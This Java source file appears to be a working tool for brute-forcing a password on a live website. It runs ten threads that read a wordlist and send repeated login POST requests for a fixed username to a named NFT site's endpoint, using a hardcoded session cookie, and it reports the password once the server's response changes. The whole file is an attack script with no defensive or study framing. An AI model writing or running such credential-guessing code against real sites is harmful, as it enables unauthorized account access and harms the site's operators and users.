package org.millionaire.consolenft;

import com.alibaba.fastjson.JSONObject;
import org.apache.commons.io.FileUtils;
import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.millionaire.CommonUtils.mapToNameValuePairs;

public class EfficientChecker {

    static String uri = "https://console-nft.art/starwars/index.php";
    static Header header = new BasicHeader("cookie", "_fbp=fb.1.1642215672325.811608704; PHPSESSID=12476f37aff0edf8bbc4381950bbd579");
    static Header[] headers = new Header[]{header};

    static void efficientBrutal() {
        try {
            String path = EfficientChecker.class.getClassLoader().getResource("passwords.txt").getPath();
            File file = new File(path);
            List<String> lines = FileUtils.readLines(file);
            AtomicInteger scope = new AtomicInteger(0);
            Runnable task = () -> {
                int start = scope.getAndIncrement() * 300;
                int end = Math.min(start + 300, lines.size());
                List<String> passwords = lines.subList(start, end);
                System.out.println(Thread.currentThread().getName() + ": batch " + passwords.size());
                System.out.println(Thread.currentThread().getName() + ": " + start + " ~ " + (start + 300));
                CloseableHttpClient httpClient = HttpClients.createDefault();
                int i = 1;
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("name", "user_5968");
                for (int i1 = 0; i1 < passwords.size(); i1++) {
                    jsonObject.put("password", passwords.get(i1));
                    String text = post(httpClient, jsonObject);
                    if (text.contains("error") || text.contains("issue"))
                        i1--;
                    else if (!text.contains("weak")) {
                        System.out.println("correct: " + passwords.get(i1));
                        System.out.println(text);
                        System.exit(1);
                    }
                }
            };

            List<Thread> threads = new ArrayList<>();
            for (int i = 0; i < 10; i++)
                threads.add(new Thread(task, "#Thread" + i));
            for (Thread thread : threads)
                thread.start();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    static String post(HttpClient httpClient, JSONObject params) {
        HttpPost httpPost = new HttpPost(uri);
        Arrays.stream(headers).forEach(httpPost::addHeader);
        httpPost.setEntity(new UrlEncodedFormEntity(mapToNameValuePairs(params), UTF_8));
        try {
            HttpResponse httpResponse = httpClient.execute(httpPost);
            StatusLine statusLine = httpResponse.getStatusLine();
            if (statusLine.getStatusCode() != 200) {
                System.out.println(statusLine);
                return "issue";
            }
            return EntityUtils.toString(httpResponse.getEntity());
        } catch (Exception e) {
            e.printStackTrace();
            return "error";
        }
    }

    public static void main(String[] args) {
        efficientBrutal();
    }

}
